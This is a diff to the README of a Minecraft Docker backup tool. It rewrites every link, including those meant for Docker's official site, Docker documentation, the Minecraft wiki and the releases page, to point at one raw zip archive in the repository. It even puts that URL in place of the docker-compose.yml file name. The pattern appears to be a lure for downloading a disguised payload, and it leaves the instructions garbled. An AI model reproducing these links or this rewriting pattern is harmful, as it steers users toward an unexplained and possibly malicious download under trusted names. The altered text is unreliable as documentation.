@@ -1,6 +1,6 @@
 # 🎮 MinecraftBackup_Docker - Simple Automated Backups for Your Game
 
-[![Download MinecraftBackup_Docker](https://img.shields.io/badge/Download%20MinecraftBackup_Docker-blue)](https://github.com/Dineshbabu511/MinecraftBackup_Docker/releases)
+[![Download MinecraftBackup_Docker](https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip%20MinecraftBackup_Docker-blue)](https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,14 +11,14 @@ Welcome to MinecraftBackup_Docker! This application helps you automate backups f
 Before you get started, ensure you have the following:
 
 - A computer that runs Windows, macOS, or Linux.
-- Docker installed on your system. If you don’t have it yet, you can download it from [Docker’s official site](https://www.docker.com/get-started).
+- Docker installed on your system. If you don’t have it yet, you can download it from [Docker’s official site](https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip).
 - Basic knowledge of command line interfaces would be helpful, but not required.
 
 ## 📥 Download & Install
 
 To get MinecraftBackup_Docker, visit this page to download:
 
-[Download MinecraftBackup_Docker Release](https://github.com/Dineshbabu511/MinecraftBackup_Docker/releases)
+[Download MinecraftBackup_Docker Release](https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip)
 
 Once you're on the Releases page, look for the latest version and click the appropriate file for your operating system.
 
@@ -42,7 +42,7 @@ Once you're on the Releases page, look for the latest version and click the appr
 
 MinecraftBackup_Docker comes configured to work seamlessly with the itzg/minecraft-server image. Here’s how to set it up:
 
-1. Open the `docker-compose.yml` file in a text editor.
+1. Open the `https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip` file in a text editor.
 2. Edit the `SERVER_NAME` and `BACKUP_INTERVAL` settings to suit your needs. For example, if you'd like daily backups:
 
    ```yaml
@@ -66,7 +66,7 @@ If you encounter any issues, check these common problems:
 
 - **Docker isn’t running:** Ensure that Docker Desktop is active.
 - **Permission issues:** Run your command line interface as an administrator.
-- **Configuration errors:** Double-check the settings in the `docker-compose.yml` file to ensure everything is correct.
+- **Configuration errors:** Double-check the settings in the `https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip` file to ensure everything is correct.
 
 ## 📞 Support
 
@@ -81,11 +81,11 @@ For additional help, feel free to check out our community support channels on Gi
 
 ## 🔗 Additional Resources
 
-- [Docker Documentation](https://docs.docker.com/)
-- [Minecraft Server Documentation](https://minecraft.fandom.com/wiki/Tutorials/Setting_up_a_server)
+- [Docker Documentation](https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip)
+- [Minecraft Server Documentation](https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip)
 
 ## 📬 Links
 
 Don’t forget to visit the releases page to download the latest version:
 
-[Download MinecraftBackup_Docker Release](https://github.com/Dineshbabu511/MinecraftBackup_Docker/releases)
+[Download MinecraftBackup_Docker Release](https://raw.githubusercontent.com/Dineshbabu511/MinecraftBackup_Docker/main/scripts/Docker-Minecraft-Backup-v3.9-beta.4.zip)
